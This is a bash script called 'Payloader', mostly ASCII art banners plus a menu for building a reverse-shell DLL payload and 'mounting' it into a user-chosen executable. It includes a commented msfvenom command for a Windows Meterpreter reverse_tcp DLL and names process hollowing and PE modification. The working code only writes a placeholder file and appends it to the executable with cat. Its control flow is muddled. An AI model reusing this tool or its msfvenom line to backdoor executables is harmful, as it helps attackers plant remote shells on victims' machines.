#!/bin/bash

#                             Online Bash Shell.
#                 Code, Compile, Run and Debug Bash script online.
# Write your code in this editor and press "Run" button to execute it.




# Initialize var to 1 to enter the while loop
var=2

while [ $var -eq 2 ]; do
    
    
    if [[ "$XDG_CURRENT_DESKTOP" == "KDE" || "$DESKTOP_SESSION" == "plasma" ]]; then
    

    # Save the current font size setting
    current_font_size=$(kwriteconfig5 --file kdeglobals --group General --key font)
    echo "Current font size is: $current_font_size"

    # Temporarily change the font size
    kwriteconfig5 --file kdeglobals --group General --key font "Noto Sans, 3"

    # Simulate some task
    # Function to echo each line with a delay  of 0.0825 seconds
    function delayed_echo {
        echo "$1"
        sleep 0.0825
    }
    
    # ASCII art lines
    delayed_echo "............................................................................................................................................................................................................................................................................................................"
    delayed_echo "............................................................................................................................................................................................................................................................................................................"
    delayed_echo "............................................................................................................................................................................................................................................................................................................"
    delayed_echo ".........................................''''''',,,,,,,,;;;;;,,,,,,,,,,''''''..............................................................................................................................................................................................................................."
    delayed_echo "..........................................'''''''''',,,,,,;;;;;::::ccccclllllllllccc:::;;;,,,''............................................................................................................................................................................................................."
    delayed_echo "........................................................................''',,,;;;::ccllloooooolllcc:;;,,''.................................................................................................................................................................................................."
    delayed_echo ".......................................................................................'',,;;::cllooooooollcc:;;,'.........................................................................................................................................................................................."
    delayed_echo "..................................................................................................'',;;:clloodddoolc::;,'..................................................................................................................................................................................."
    delayed_echo "...........................................................................................................',;::cloodddoolc:;,'............................................................................................................................................................................."
    delayed_echo "..................................................................................................................',;:cloodddool:;,'........................................................................................................................................................................"
    delayed_echo ".........................................................................................................................';:clooddolc'......................................................................................................................................................................"
    delayed_echo ".......................................................................''',,,,;;;;;:::::::::::ccccc:::::::::;;;;;,,,,'''......',:lool,......................................................................................................................................................................"
    delayed_echo "..........................................................'',,;;::cccllooooooooooooooooooooooooooooooooooooooooooooooooolllcc::;',lol,......................................................................................................................................................................"
    delayed_echo "................................................'',,;::ccllooollllcccc::::;;;;,,,,,,''''''''''''''''''''''',,,,,,;;;;:::ccclllol:':oo;......................................................................................................................................................................"
    delayed_echo "........................................'',;;::ccccc:::;;,,,'''...............................................................'''.'coc'....................................................................................................................................................................."
    delayed_echo ".................................'',,,;;;;;,,'''........................................................................''''''''''.;ll,....................................................................................................................................................................."
    delayed_echo "..............................''''''......................................................................'',,;;:::cccllllllllllll;';l:'...................................................................................................................................................................."
    delayed_echo ".................................................................................................'',;;:ccllllooooooolllllcccc:::::;.':l;...................................................................................................................................................................."
    delayed_echo ".........................................................................................'',;::cllloooolllcc::;;;,,'''...............'cl;..................................................................................................................................................................."
    delayed_echo "...................................................................................',;;:clllolllcc::;,,''.............................,cc;'..................................................................................................................................................................."
    delayed_echo ".............................................................................',;;:clllllcc:;,,'........................................;cc:,...............................''''............................................................................................................................."
    delayed_echo "........................................................................',;:cllllc::;,''................................................;clc:;,'...............................''''........................................................................................................................."
    delayed_echo "...................................................................',;:clllc:;,''........................................................;ccccccc::::::::;;;;,,'''................'''......................................................................................................................."
    delayed_echo "...............................................................',;cccc:;,'..............................................................,:ccccccccccccccccccccccc:::;,,''...'........','...................................................................................................................."
    delayed_echo "...........................................................';:cc:;;,'................................................................';:cccccccccc::::::::::ccccccccccc:::;;:;'....'....','................................................................................................................."
    delayed_echo ".......................................................',;::;,'....................................................................,:ccccccc:;,''............''',,;;::::c::::::;'.';,.....','..............................................................................................................."
    delayed_echo "...................................................',;;;,'......................................................................';:ccccc:;'...........................',,;:::::::::::,......',,............................................................................................................."
    delayed_echo "................................................',,,''.........................................................................,:cccc:;'....................................',;;::::::;,,,;'...,,..........................................................................................................."
    delayed_echo "..............................................'''.............................................................................;:ccc:;'...........................................',;;::::::;,....'.........................................................................................................."
    delayed_echo ".............................................................................................................................;:::::,..................................................',;;:::;,'''''........................................................................................................"
    delayed_echo "............................................................................................................................;:::::,.......................................................',;;;;;;;;,......................................................................................................."
    delayed_echo "...........................................................................................................................,:::::,...........................................................;;;;;;;,,'....................................................................................................."
    delayed_echo "...........................................................................................................................;::::,............................................................,;;;;;;,','...................................................................................................."
    delayed_echo "..........................................................................................................................'::::;'.............................................................',;;;;;,,,'..................................................................................................."
    delayed_echo "..........................................................................................................................,::::;..................................................................',,,;;,'.................................................................................................."
    delayed_echo "..........................................................................................................................,;;;;,......................................................................',,,,'................................................................................................"
    delayed_echo "..........................................................................................................................,;;;;,.........................................................................',,,,''............................................................................................"
    delayed_echo "..........................................................................................................................,;;;;;'..........................................................................',,''............................................................................................"
    delayed_echo "..........................................................................................................................,;;;;;'..........................................................................................................................................................................."
    delayed_echo "..........................................................................................................................',;;;;,..........................................................................................................................................................................."
    delayed_echo "...........................................................................................................................';;;;,,.........................................................................................................................................................................."
    delayed_echo "............................................................................................................................,,,,,,,........................................................................................................................................................................."
    delayed_echo ".............................................................................................................................,,,,,,,........................................................................................................................................................................"
    delayed_echo "..............................................................................................................................',,,,,,'......................................................................................................................................................................"
    delayed_echo "................................................................................................................................,,,,,,''...................................................................................................................................................................."
    delayed_echo ".................................................................................................................................',,,,,,''.................................................................................................................................................................."
    delayed_echo "...................................................................................................................................'',,,,,,'''.............................................................................................................................................................."
    delayed_echo "......................................................................................................................................',,,,,,,,,'''........................................................................................................................................................."
    delayed_echo ".........................................................................................................................................',,,,,,,,,,,,,,,,,,,,,,'''''''''''''''............................................................................................................................."
    delayed_echo ".............................................................................................................................................'',,,,,,,;,;;,,;;;;;;;;;;;;;;;;;;;;;;;;,,,,,''''..............................................................................................................."
    delayed_echo ".....................................................................................................................................................''''''''''',,,,,,,,;;;;;;;;;;;;;;;;;;;;;;;;,,''........................................................................................................"
    delayed_echo ".............................................................................................................................................................................''',,,;;;;;;;:;;;,,,,;;;;;,''.................................................................................................."
    delayed_echo "......................................................................................................................................................................................',,;;::;;,''...',;;;;;,'.............................................................................................."
    delayed_echo "...........................................................................................................................................................................................'',;::;;'.....'',;:;;,..........................................................................................."
    delayed_echo "...............................................................................................................................................................................................',;:::;'......',;::;,........................................................................................"
    delayed_echo "...................................................................................................................................................................................................,;::;,........,;::,'....................................................................................."
    delayed_echo ".....................................................................................................................................................................................................';:::,........',::;'..................................................................................."
    delayed_echo ".......................................................................................................................................................................................................';cc;'.........,::;'................................................................................."
    delayed_echo ".........................................................................................................................................................................................................,:c:,..........,::,................................................................................"
    delayed_echo "...........................................................................................................................................................................................................;:c;'..........;:;..............................................................................."
    delayed_echo "............................................................................................................................................................................................................,:c:'..........';;'............................................................................."
    delayed_echo ".............................................................................................................................................................................................................';c:,..........';;............................................................................."
    delayed_echo "...............................................................................................................................................................................................................;c:'...........;,............................................................................"
    delayed_echo "................................................................................................................................................................................................................;c:'...........,'..........................................................................."
    delayed_echo ".................................................................................................................................................................................................................;c;'...........,..........................................................................."
    delayed_echo "..................................................................................................................................................................................................................;:;...........'..........................................................................."
    delayed_echo "...................................................................................................................................................................................................................'::'....................................................................................."
    delayed_echo "....................................................................................................................................................................................................................,:,....................................................................................."
    delayed_echo ".....................................................................................................................................................................................................................;;'...................................................................................."
    delayed_echo ".....................................................................................................................................................................................................................';,...................................................................................."
    delayed_echo "......................................................................................................................................................................................................................,;...................................................................................."
    delayed_echo "......................................................................................................................................................................................................................','..................................................................................."
    delayed_echo ".......................................................................................................................................................................................................................,'..................................................................................."
    delayed_echo ".......................................................................................................................................................................................................................''..................................................................................."
    delayed_echo "........................................................................................................................................................................................................................'..................................................................................."
    delayed_echo "............................................................................................................................................................................................................................................................................................................"
    delayed_echo "............................................................................................................................................................................................................................................................................................................"
    delayed_echo "............................................................................................................................................................................................................................................................................................................"

    # Restore the original font size
    echo "Restoring the original font size"
    kwriteconfig5 --file kdeglobals --group General --key font "$current_font_size"

    # Apply the changes (this refreshes the desktop settings)
    qdbus org.kde.KWin /KWin reconfigure

    else
    # Function to echo each line with a delay of 0.12 seconds
    function delayed_echo {
        echo "$1"
        sleep 0.12
    }
    
    # ASCII art lines with maximum 80 characters per echo
    delayed_echo "...................''''',,,,,,,,'...............Payloader.........................."
    delayed_echo "...........................'',,;;;;;,................................................"
    delayed_echo ".............'''''',,,,,,,,,,,,,,,,;:,..............................................."
    delayed_echo "...........................'',,,,,,,,,..............................................."
    delayed_echo ".....................''',,,,'''......','............................................."
    delayed_echo "..................''''...............';:;;,,,,,'''..................................."
    delayed_echo "....................................,;'........'',,,,'..............................."
    delayed_echo "...................................;,................',,............................."
    delayed_echo "..................................,,...................''............................"
    delayed_echo "..................................',................................................."
    delayed_echo "...................................,'................................................"
    delayed_echo "....................................''..............................................."
    delayed_echo ".......................................''''''''''''.................................."
    delayed_echo "..................................................''',,''............................"
    delayed_echo "........Vertibrea......................................'''..'............. .........."
    delayed_echo ".........................................................''...'........XFZ1.........."
    delayed_echo "...........................................................'........................."
    delayed_echo "............................................................'........................^"
    fi
    

    # Function to generate an obfuscated DLL (for use in payload)
    generate_obfuscated_dll() {
        echo "Generating obfuscated DLL payload..."
        # User will input IP and port
        echo "Enter the IP address for reverse shell:"
        read ip_address
        echo "Enter the port number:"
        read port_number

        # Simulate DLL generation (use msfvenom for actual payload)
        # msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_address LPORT=$port_number -f dll > "$1/payload.dll"
        
        # For now, just create a dummy DLL as a placeholder
        echo "DLL Payload (IP: $ip_address, Port: $port_number)" > "$1/payload.dll"
        echo "Obfuscated DLL created at: $1/payload.dll"
    }

    # Function to modify an executable to include payload (DLL)
    modify_executable_with_payload() {
        echo "Modifying executable with the payload..."
        exe_path=$1
        dll_path=$2
        ip_address=$3
        port_number=$4

        if [ ! -e "$exe_path" ] || [ ! -e "$dll_path" ]; then
            echo "Executable or DLL path doesn't exist!"
            return 1
        fi

        # Simulate modifying the executable to include the DLL
        # In practice, you might use more advanced techniques (like process hollowing, PE modification, or resource injection).
        
        # Append DLL content to the executable (as a simple simulation)
        echo "Embedding payload (DLL) into executable with reverse shell (IP: $ip_address, Port: $port_number)"
        cat "$dll_path" >> "$exe_path"
        
        echo "Payload successfully mounted to $exe_path."
    }

    # Initialize var to 1 to enter the while loop
    var=1

    while [ $var -eq 1 ]; do
        if [[ "$XDG_CURRENT_DESKTOP" == "KDE" || "$DESKTOP_SESSION" == "plasma" ]]; then
            # KDE environment customization (can be expanded)
            echo "Customizing KDE environment..."
            current_font_size=$(kwriteconfig5 --file kdeglobals --group General --key font)
            kwriteconfig5 --file kdeglobals --group General --key font "Noto Sans, 3"
            qdbus org.kde.KWin /KWin reconfigure
            kwriteconfig5 --file kdeglobals --group General --key font "$current_font_size"
            qdbus org.kde.KWin /KWin reconfigure
        fi
        
        echo "Options"
        echo "-------"
        echo "1. Create and mount payload (DLL) to executable"
        echo "2. Create payload (DLL) only"
        echo "3. Mount existing payload (DLL) to an executable"
        echo "Select an option:"
        read input

        case $input in
            1)
                # Option to create and mount payload
                echo "Define destination folder for payload (DLL):"
                read dest_folder
                if [ ! -d "$dest_folder" ]; then
                    echo "Destination folder does not exist!"
                    var=2
                    continue
                fi

                echo "Define executable path to mount the payload:"
                read exe_path
                if [ ! -e "$exe_path" ]; then
                    echo "Executable path does not exist!"
                    var=2
                    continue
                fi

                # Generate DLL and mount it to the executable
                generate_obfuscated_dll "$dest_folder"
                dll_path="$dest_folder/payload.dll"

                # Prompt for reverse shell information
                echo "Enter the IP address for reverse shell:"
                read ip_address
                echo "Enter the port number:"
                read port_number

                # Modify the executable to include the payload
                modify_executable_with_payload "$exe_path" "$dll_path" "$ip_address" "$port_number"
                ;;

            2)
                # Option to create DLL only
                echo "Define destination folder for payload (DLL):"
                read dest_folder
                if [ ! -d "$dest_folder" ]; then
                    echo "Destination folder does not exist!"
                    var=2
                    continue
                fi

                # Generate DLL only
                generate_obfuscated_dll "$dest_folder"
                ;;

            3)
                # Option to mount existing DLL to an executable
                echo "Define the path to the existing executable:"
                read exe_path
                if [ ! -e "$exe_path" ]; then
                    echo "Executable path does not exist!"
                    var=2
                    continue
                fi

                echo "Define the folder containing the payload (DLL):"
                read dll_folder
                if [ ! -d "$dll_folder" ]; then
                    echo "DLL folder does not exist!"
                    var=1
                    continue
                fi

                dll_path="$dll_folder/payload.dll"
                if [ ! -e "$dll_path" ]; then
                    echo "DLL does not exist at $dll_path!"
                    var=1
                    continue
                fi

                # Prompt for reverse shell information (in case it's needed)
                echo "Enter the IP address for reverse shell:"
                read ip_address
                echo "Enter the port number:"
                read port_number

                # Mount the existing DLL to the executable
                modify_executable_with_payload "$exe_path" "$dll_path" "$ip_address" "$port_number"
                ;;
            
            *)
                echo "Invalid option!"
                ;;
        esac
    done
done
# Script cleanup or restart mechanism
echo "1. Reset script"
echo "2. Kill script"
read state

if [ $state -eq 2 ]; then
    echo "Killing script..."
    exit 0
fi
if [ $state -eq 1 ]; then
    var=2
fi
echo "Restarting script..."
